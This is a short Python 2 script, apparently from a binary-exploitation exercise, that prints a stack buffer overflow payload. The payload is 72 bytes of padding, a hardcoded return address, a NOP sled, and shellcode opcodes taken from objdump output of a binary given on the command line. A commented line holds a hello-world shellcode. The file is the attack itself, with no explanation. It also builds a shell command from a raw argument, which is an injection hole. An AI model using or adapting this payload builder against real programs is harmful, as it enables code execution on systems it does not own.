import os,sys

shell_binary = "shell_code"
if len(sys.argv) == 2:
	shell_binary = sys.argv[1]

output = os.popen("objdump -d "+ shell_binary).read().split('\n')

code = "A"*72
code += "\xf4\xe0\xff\xff\xff\x7f\x00\x00"
code += "\x90"*512

for lines in output:
	l = lines.split('\t')
	if len(l)!=3: continue
	opcodes = l[1].strip()
	for i in opcodes.split():
		code += chr(int(i,16))
# \x42\xdf\xff\xff\xff\x7f\x00\x00
# code =  "\xeb\x10\xb0\x01\xb2\x01\x5e\xb2\x0e\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xeb\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x20"
print code
